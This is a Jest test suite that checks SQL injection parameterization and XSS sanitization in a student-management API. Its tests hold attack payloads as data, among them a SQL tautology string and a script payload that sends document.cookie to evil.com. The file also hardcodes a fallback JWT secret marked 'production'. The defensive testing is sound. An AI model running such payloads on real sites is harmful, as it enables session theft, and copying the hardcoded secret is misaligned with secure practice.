/**
 * =====================================================
 * injectionSecurity.test.js
 * -----------------------------------------------------
 * Security Test Suite: SQL Injection & XSS Input Sanitization.
 * Tests OWASP A03: Injection & Output Encoding.
 * =====================================================
 */
const request = require("supertest");
const jwt = require("jsonwebtoken");

jest.mock("../../src/config/db", () => ({
    pool: {
        query: jest.fn(),
        execute: jest.fn()
    }
}));

const { pool } = require("../../src/config/db");
const app = require("../../src/app");
const { sanitizeString } = require("../../src/middleware/securityMiddleware");

const JWT_SECRET = process.env.JWT_SECRET || "cohort_university_super_secret_jwt_key_2026_production";
const adminToken = jwt.sign({ id: 1, username: "admin", role: "admin" }, JWT_SECRET);

describe("Injection & XSS Sanitization (OWASP A03: Injection)", () => {
    beforeEach(() => {
        jest.clearAllMocks();
    });

    describe("SQL Injection Prevention", () => {
        test("1. SQL injection payloads in student queries are safely parameterized", async () => {
            const sqliPayload = "1' OR '1'='1";
            pool.query.mockResolvedValueOnce([[]]);

            const res = await request(app)
                .get(`/api/students/${encodeURIComponent(sqliPayload)}`)
                .set("Authorization", `Bearer ${adminToken}`);

            expect(res.statusCode).toBe(404);
            expect(pool.query).toHaveBeenCalled();
            const calledSql = pool.query.mock.calls[0][0];
            const calledParams = pool.query.mock.calls[0][1];
            expect(calledSql).toContain("WHERE s.id = ?");
            expect(calledParams).toContain(sqliPayload);
        });
    });

    describe("XSS Neutralization & Sanitization", () => {
        test("2. sanitizeString strips inline <script> tags", () => {
            const dirty = "John Doe<script>alert('xss')</script>";
            const clean = sanitizeString(dirty);
            expect(clean).toBe("John Doe");
            expect(clean).not.toContain("<script>");
        });

        test("3. sanitizeString strips inline event handlers like onerror and onclick", () => {
            const dirty = '<img src="x" onerror="alert(1)">';
            const clean = sanitizeString(dirty);
            expect(clean).not.toContain('onerror="alert(1)"');
        });

        test("4. XSS sanitizer middleware automatically cleans malicious req.body fields", async () => {
            pool.query.mockResolvedValueOnce([[]]); // No duplicate email
            pool.execute.mockResolvedValueOnce([{ insertId: 99 }]); // Student created
            pool.query.mockResolvedValueOnce([[{ id: 99, name: "Alice", email: "alice@cohort.edu" }]]);

            const maliciousName = "Alice<script>fetch('http://evil.com/steal?c='+document.cookie)</script>";

            const res = await request(app)
                .post("/api/students")
                .set("Authorization", `Bearer ${adminToken}`)
                .send({
                    name: maliciousName,
                    email: "alice@cohort.edu"
                });

            expect(res.statusCode).toBe(201);
            expect(pool.execute).toHaveBeenCalled();
            const insertedName = pool.execute.mock.calls[0][1][0];
            expect(insertedName).toBe("Alice");
            expect(insertedName).not.toContain("<script>");
        });
    });
});
